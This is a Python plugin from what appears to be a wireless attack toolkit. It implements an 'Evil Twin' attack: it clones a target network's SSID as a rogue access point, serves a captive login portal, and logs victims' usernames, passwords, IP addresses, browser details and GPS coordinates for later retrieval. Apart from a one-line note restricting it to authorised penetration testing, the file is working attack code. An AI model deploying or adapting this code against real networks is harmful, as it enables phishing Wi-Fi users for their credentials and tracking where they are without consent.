"""
Evil Twin Plugin - Rogue AP creation and credential harvesting.

Creates fake access points to attract clients and capture credentials
via a captive portal. Supports multiple portal templates.

WARNING: This is for authorized penetration testing only.
"""

from __future__ import annotations

import asyncio
import logging
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

priority = 140  # Run after other attack plugins

# Plugin state
_RUN = False
_TASK: asyncio.Task[None] | None = None
_ap_manager: Any = None
_portal: Any = None
_event_bus: Any = None
_gps_client: Any = None

_stats = {
    "sessions_total": 0,
    "clients_total": 0,
    "credentials_total": 0,
    "errors": 0,
    "current_ssid": None,
    "status": "stopped",
}

_credentials_log: list[dict[str, Any]] = []


def init(cfg: dict[str, Any]) -> None:
    """Initialize Evil Twin plugin."""
    global _RUN

    if not cfg.get("enabled", False):
        logger.debug("Evil Twin plugin disabled")
        return

    _RUN = True

    async def start_services() -> None:
        await _init_async(cfg)

    try:
        loop = asyncio.get_running_loop()
        loop.create_task(start_services())
    except RuntimeError:
        logger.debug("No event loop - Evil Twin will start later")


async def _init_async(cfg: dict[str, Any]) -> None:
    """Async initialization."""
    global _ap_manager, _portal, _event_bus, _gps_client

    try:
        from ...infrastructure.eviltwin.ap_manager import APConfig, APManager
        from ...infrastructure.eviltwin.captive_portal import (
            CaptivePortal,
            PortalConfig,
            PortalTemplate,
        )

        # Create AP manager
        ap_config = APConfig(
            interface=cfg.get("interface", "wlan1"),
            ssid=cfg.get("default_ssid", "FreeWiFi"),
            channel=cfg.get("channel", 6),
            log_dir=Path(cfg.get("log_dir", "logs/eviltwin")),
        )

        _ap_manager = APManager(config=ap_config)

        if not await _ap_manager.start():
            logger.warning("Evil Twin AP manager failed to start")
            return

        # Create captive portal
        template_name = cfg.get("portal_template", "generic")
        try:
            template = PortalTemplate(template_name)
        except ValueError:
            template = PortalTemplate.GENERIC

        portal_config = PortalConfig(
            template=template,
            title=cfg.get("portal_title", "WiFi Login"),
            redirect_url=cfg.get("redirect_url", "https://www.google.com"),
            port=cfg.get("portal_port", 80),
        )

        _portal = CaptivePortal(
            config=portal_config,
            on_credential=_on_credential_captured,
        )

        # Try to get event bus
        try:
            from ...core.events import get_event_bus
            _event_bus = get_event_bus()
        except ImportError:
            pass

        # Try to get GPS client
        try:
            from .wardriver import _gps_client as wgps
            _gps_client = wgps
        except ImportError:
            pass

        _stats["status"] = "ready"
        logger.info("Evil Twin plugin initialized")

    except Exception as e:
        logger.error("Evil Twin init error: %s", e)
        _stats["errors"] += 1


async def _on_credential_captured(credential: Any) -> None:
    """Callback when credential is captured."""
    global _stats

    _stats["credentials_total"] += 1

    # Get GPS position
    lat, lon = None, None
    if _gps_client is not None:
        try:
            pos = _gps_client.position
            if pos and pos.has_fix:
                lat, lon = pos.latitude, pos.longitude
        except Exception:
            pass

    # Log credential
    cred_record = {
        "timestamp": datetime.now(UTC).isoformat(),
        "username": credential.username,
        "password": credential.password,
        "client_ip": credential.client_ip,
        "user_agent": credential.user_agent,
        "ssid": _stats.get("current_ssid", ""),
        "latitude": lat,
        "longitude": lon,
    }
    _credentials_log.append(cred_record)

    # Also record in AP manager
    if _ap_manager is not None:
        _ap_manager.record_credential(
            mac="",  # Don't have MAC in portal
            username=credential.username,
            password=credential.password,
        )

    # Emit event
    if _event_bus is not None:
        try:
            from ...core.events import EventType
            await _event_bus.emit(
                EventType.ATTACK_COMPLETED,
                data={
                    "type": "credential_capture",
                    "username": credential.username,
                    "client_ip": credential.client_ip,
                    "ssid": _stats.get("current_ssid", ""),
                },
                source="evil_twin",
            )
        except Exception:
            pass

    logger.warning(
        "💀 Credential captured: %s from %s",
        credential.username,
        credential.client_ip,
    )


async def start_attack(
    ssid: str,
    channel: int = 6,
    bssid: str | None = None,
    template: str = "generic",
) -> dict[str, Any]:
    """
    Start an Evil Twin attack.
    
    Args:
        ssid: Target SSID to clone
        channel: WiFi channel
        bssid: Optional target BSSID to spoof
        template: Portal template name
    
    Returns:
        Result dict with status
    """
    global _stats

    if _ap_manager is None:
        return {"ok": False, "error": "AP manager not initialized"}

    if _ap_manager.status.value == "running":
        return {"ok": False, "error": "Attack already running"}

    try:
        # Start AP
        success = await _ap_manager.clone_ap(
            ssid=ssid,
            bssid=bssid,
            channel=channel,
        )

        if not success:
            return {"ok": False, "error": "Failed to start AP"}

        # Start portal
        if _portal is not None:
            await _portal.start()

        _stats["sessions_total"] += 1
        _stats["current_ssid"] = ssid
        _stats["status"] = "running"

        logger.info("Evil Twin attack started: %s on channel %d", ssid, channel)

        return {
            "ok": True,
            "ssid": ssid,
            "channel": channel,
            "status": "running",
        }

    except Exception as e:
        logger.error("Failed to start attack: %s", e)
        _stats["errors"] += 1
        return {"ok": False, "error": str(e)}


async def stop_attack() -> dict[str, Any]:
    """Stop the current Evil Twin attack."""
    global _stats

    try:
        if _portal is not None:
            await _portal.stop()

        if _ap_manager is not None:
            await _ap_manager.stop()

        _stats["status"] = "stopped"
        _stats["current_ssid"] = None

        logger.info("Evil Twin attack stopped")
        return {"ok": True}

    except Exception as e:
        logger.error("Failed to stop attack: %s", e)
        return {"ok": False, "error": str(e)}


def tick(ctx: dict[str, Any]) -> None:
    """Plugin tick - not used, async loop handles everything."""
    pass


def shutdown() -> None:
    """Shutdown plugin."""
    global _RUN, _TASK

    _RUN = False

    if _TASK and not _TASK.done():
        _TASK.cancel()

    # Stop services synchronously if possible
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(stop_attack())
    except RuntimeError:
        pass

    logger.info("Evil Twin plugin shutdown")


def get_metrics() -> dict[str, Any]:
    """Get Prometheus-compatible metrics."""
    ap_metrics = {}
    portal_metrics = {}

    if _ap_manager is not None:
        ap_metrics = _ap_manager.get_metrics()
    if _portal is not None:
        portal_metrics = _portal.get_metrics()

    return {
        **ap_metrics,
        **portal_metrics,
        "momo_eviltwin_plugin_errors": _stats["errors"],
    }


def get_status() -> dict[str, Any]:
    """Get plugin status."""
    return {
        "running": _RUN,
        "status": _stats["status"],
        "current_ssid": _stats["current_ssid"],
        "stats": dict(_stats),
        "clients_connected": len(_ap_manager.clients) if _ap_manager else 0,
        "credentials_captured": len(_credentials_log),
    }


def get_credentials(limit: int = 50) -> list[dict[str, Any]]:
    """Get captured credentials."""
    return _credentials_log[-limit:]


def get_clients() -> list[dict[str, Any]]:
    """Get connected clients."""
    if _ap_manager is None:
        return []
    return [c.to_dict() for c in _ap_manager.clients]

